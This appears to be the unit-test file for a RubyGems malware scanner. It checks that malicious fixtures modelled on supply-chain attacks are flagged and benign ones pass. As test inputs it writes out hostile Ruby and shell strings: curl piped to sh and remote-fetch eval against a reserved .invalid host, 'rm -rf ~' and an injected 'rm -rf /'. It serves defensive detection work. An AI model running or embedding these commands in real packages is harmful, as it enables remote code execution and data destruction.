"""Canary + control tests:  python3 -m unittest  (from the repo root)

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular gems really use) must scan SAFE. The fixtures are inert: hosts are
reserved (.invalid / TEST-NET) or fake paths, tokens read CANARY, and nothing is executed.
"""
import gzip
import io
import os
import sys
import tarfile
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import rubygems_audit as ra  # noqa: E402

FIX = os.path.join(HERE, "fixtures")

EXPECT = {
    # real incidents
    "mal-rest-client-hijack": ("CRITICAL", ["remote_eval", "env_exfil"]),
    "mal-strong-password": ("CRITICAL", ["remote_eval"]),
    "mal-bootstrap-sass-backdoor": ("CRITICAL", ["request_eval"]),
    "mal-atlas-client-dropper": ("CRITICAL", ["disguised_executable", "disguised_binary", "install_runs_exe"]),
    "mal-clipboard-startup": ("CRITICAL", ["persistence_write", "clipboard_hijack"]),
    "mal-fastlane-telegram-proxy": ("CRITICAL", ["token_proxy", "token_exfil"]),
    # generic install / load-time shapes
    "mal-extconf-curl-sh": ("CRITICAL", ["download_execute"]),
    "mal-gemspec-exec": ("CRITICAL", ["download_execute"]),
    "mal-plugin-cred-exfil": ("CRITICAL", ["credential_exfil"]),
    "mal-revshell": ("CRITICAL", ["reverse_shell"]),
    "mal-worm": ("CRITICAL", ["worm_propagation"]),
    "mal-wiper": ("CRITICAL", ["destructive"]),
    "mal-env-exfil-require": ("CRITICAL", ["env_exfil"]),
    "mal-obfuscated-require": ("CRITICAL", ["encoded_eval"]),
    "mal-dns-beacon": ("CRITICAL", ["dns_exfil"]),
}


def scan_fixture(name):
    meta, files, heads = ra.files_from_dir(os.path.join(FIX, name))
    return ra.scan_gem(files, meta, name, heads=heads)


class Canaries(unittest.TestCase):
    def test_every_fixture_is_classified(self):
        names = sorted(os.listdir(FIX))
        for n in names:
            self.assertTrue(n.startswith("ok-") or n in EXPECT, n)

    def test_malicious_fire(self):
        for name, (level, ids) in sorted(EXPECT.items()):
            with self.subTest(name=name):
                r = scan_fixture(name)
                got = {f["id"] for f in r["findings"]}
                self.assertEqual(r["risk_level"], level, (name, r["summary"], sorted(got)))
                for i in ids:
                    self.assertIn(i, got, name)

    def test_benign_controls_safe(self):
        for name in sorted(n for n in os.listdir(FIX) if n.startswith("ok-")):
            with self.subTest(name=name):
                r = scan_fixture(name)
                self.assertEqual(r["risk_level"], "SAFE",
                                 (name, [(f["id"], f["file"], f["line"], f["severity"]) for f in r["findings"]]))


class Units(unittest.TestCase):
    def test_text_pipe_to_shell(self):
        self.assertEqual(ra.scan("system('curl -s https://x.invalid/a | sh')")["risk_level"], "CRITICAL")

    def test_text_benign(self):
        self.assertEqual(ra.scan("require 'json'\nputs JSON.generate({a: 1})")["risk_level"], "SAFE")

    def test_comment_ignored(self):
        self.assertEqual(ra.scan("# eval(Net::HTTP.get(URI('https://x.invalid')))\nx = 1")["risk_level"], "SAFE")

    def test_heredoc_message_not_code_context(self):
        code, in_def, here = ra.ruby_model("x = <<~EOS\n  def foo\nEOS\ndef bar\n  1\nend\ny = 2\n")
        self.assertEqual(in_def, [False, False, False, True, True, True, False, False])

    def test_method_model(self):
        src = "module A\n  def x\n    if y\n      z\n    end\n  end\n  W = 1\nend\nputs 1 if true\n"
        _, in_def, _ = ra.ruby_model(src)
        self.assertEqual(in_def[:9], [False, True, True, True, True, True, False, False, False])

    def test_lib_method_body_not_escalated(self):
        files = {"lib/a.rb": "def go\n  eval(Base64.decode64(x))\nend\n"}
        r = ra.scan_gem(files, {"name": "a", "require_paths": ["lib"]})
        self.assertEqual(r["risk_level"], "HIGH")
        files = {"lib/a.rb": "eval(Base64.decode64(x))\n"}
        self.assertEqual(ra.scan_gem(files, {"name": "a", "require_paths": ["lib"]})["risk_level"], "CRITICAL")

    def test_aux_capped(self):
        files = {"script/setup.sh": "curl -fsSL https://x.invalid/i | sh\n"}
        self.assertEqual(ra.scan_gem(files, {"name": "a"})["risk_level"], "MEDIUM")

    def test_tests_skipped(self):
        files = {"spec/x_spec.rb": "eval(Net::HTTP.get(URI('https://x.invalid')))\n"}
        self.assertEqual(ra.scan_gem(files, {"name": "a"})["risk_level"], "SAFE")

    def test_multiline_doc_string_demoted(self):
        src = ('module T\n  newparam(:command) do\n    desc "Runs a command. For example\n'
               '      command => [\'/bin/echo\', \'hello; rm -rf /\']\n    "\n  end\nend\n')
        self.assertEqual(ra.scan_gem({"lib/t.rb": src}, {"name": "t"})["risk_level"], "SAFE")
        self.assertEqual(ra.scan("system('rm -rf ~')")["risk_level"], "CRITICAL")

    def test_split_spec(self):
        self.assertEqual(ra.split_spec("rails@7.1.0"), ("rails", "7.1.0"))
        self.assertEqual(ra.split_spec("rake"), ("rake", "latest"))

    def test_parse_metadata(self):
        y = ("--- !ruby/object:Gem::Specification\nname: foo\nversion: !ruby/object:Gem::Version\n  version: 1.2.3\n"
             "platform: ruby\nbindir: exe\nexecutables:\n- foo\nextensions:\n- ext/foo/extconf.rb\n"
             "require_paths:\n- lib\npost_install_message: |\n  hello\n  world\nfiles: []\n")
        m = ra.parse_metadata(y)
        self.assertEqual((m["name"], m["version"], m["bindir"]), ("foo", "1.2.3", "exe"))
        self.assertEqual(m["extensions"], ["ext/foo/extconf.rb"])
        self.assertEqual(m["executables"], ["foo"])
        self.assertEqual(m["post_install_message"], "hello\nworld")

    def test_gem_archive_roundtrip(self):
        meta = (b"--- !ruby/object:Gem::Specification\nname: g\nversion: !ruby/object:Gem::Version\n"
                b"  version: 0.1.0\nextensions:\n- ext/extconf.rb\nrequire_paths:\n- lib\n")
        inner = io.BytesIO()
        with tarfile.open(fileobj=inner, mode="w:gz") as tf:
            for name, data in (("ext/extconf.rb", b"system('curl https://x.invalid/a | sh')\n"),
                               ("lib/g.rb", b"module G; end\n")):
                ti = tarfile.TarInfo(name)
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
        outer = io.BytesIO()
        with tarfile.open(fileobj=outer, mode="w") as tf:
            for name, data in (("metadata.gz", gzip.compress(meta)), ("data.tar.gz", inner.getvalue())):
                ti = tarfile.TarInfo(name)
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
        m, files, heads = ra.files_from_gem(outer.getvalue())
        r = ra.scan_gem(files, m, heads=heads)
        self.assertEqual(r["risk_level"], "CRITICAL")
        self.assertEqual(r["run_time"]["extensions"], ["ext/extconf.rb"])

    def test_lockfile(self):
        lock = ("GIT\n  remote: https://github.com/x/y.git\n  specs:\n    y (1.0)\n\n"
                "GEM\n  remote: https://rubygems.org/\n  specs:\n    rack (3.0.8)\n    nokogiri (1.16.0-x86_64-linux)\n"
                "      racc (~> 1.4)\n\nPLATFORMS\n  ruby\n")
        with tempfile.NamedTemporaryFile("w", suffix=".lock", delete=False) as fh:
            fh.write(lock)
        try:
            self.assertEqual(ra.lockfile_specs(fh.name), ["nokogiri@1.16.0-x86_64-linux", "rack@3.0.8"])
        finally:
            os.unlink(fh.name)


if __name__ == "__main__":
    unittest.main()
